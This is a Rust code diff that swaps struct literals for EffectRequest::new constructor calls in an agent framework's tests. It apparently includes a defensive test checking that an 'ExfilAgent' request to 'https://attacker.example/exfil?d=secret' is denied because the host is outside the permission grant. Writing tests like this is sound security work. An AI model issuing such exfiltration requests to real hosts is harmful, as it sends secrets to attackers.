@@ -41,12 +41,12 @@ impl Reducer for FetchAgent {
         match &event.body {
             EventBody::Inbound { .. } => {
                 kv.put(b"phase".to_vec(), b"fetching".to_vec());
-                FoldOutput::with(vec![EffectRequest {
-                    kind: EffectKind::Http,
-                    target: "https://ok.host/data".into(),
-                    payload: None, // a GET
-                    timeliness: Timeliness::Interactive,
-                }])
+                FoldOutput::with(vec![EffectRequest::new(
+                    EffectKind::Http,
+                    "https://ok.host/data",
+                    None,
+                    Timeliness::Interactive,
+                )])
             }
             EventBody::EffectResult {
                 result: EffectOutcome::Ok(Some(Payload::Inline(body))),
@@ -130,12 +130,12 @@ async fn a_fetch_to_an_unpermitted_host_is_denied_before_the_client() {
     impl Reducer for ExfilAgent {
         async fn fold_async(&self, event: &Event, _kv: &mut Kv) -> FoldOutput {
             if matches!(event.body, EventBody::Inbound { .. }) {
-                FoldOutput::with(vec![EffectRequest {
-                    kind: EffectKind::Http,
-                    target: "https://attacker.example/exfil?d=secret".into(), // outside the grant
-                    payload: None,
-                    timeliness: Timeliness::Interactive,
-                }])
+                FoldOutput::with(vec![EffectRequest::new(
+                    EffectKind::Http,
+                    "https://attacker.example/exfil?d=secret",
+                    None,
+                    Timeliness::Interactive,
+                )])
             } else {
                 FoldOutput::none()
             }
